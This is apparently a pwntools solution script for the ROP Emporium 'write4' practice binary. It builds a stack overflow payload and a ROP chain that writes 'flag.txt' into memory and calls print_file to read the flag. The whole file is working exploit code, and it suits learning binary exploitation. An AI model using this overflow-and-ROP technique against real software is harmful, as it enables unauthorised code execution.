from pwn import *

elf = context.binary = ELF("./write4")
r = process()

WRITE = p64(0x0000000000400629) #mov dword ptr [rsi], edi; ret
POP_RSI_R15 = p64(0x0000000000400691)
POP_RDI = p64(0x0000000000400693)
PRINT_FILE = p64(0x00400620)

ADDRESS_PTR = 0x00601028

#gdb.attach(r)

def write_4bytes(address, content):
    return POP_RSI_R15 + p64(address) + b"A"*8 + POP_RDI + p64(u32(content)) + WRITE


payload = b"A"*40 + write_4bytes(ADDRESS_PTR, b"flag") + write_4bytes(ADDRESS_PTR+4, b".txt") + POP_RDI + p64(ADDRESS_PTR) + PRINT_FILE

r.clean()
r.sendline(payload)

r.interactive()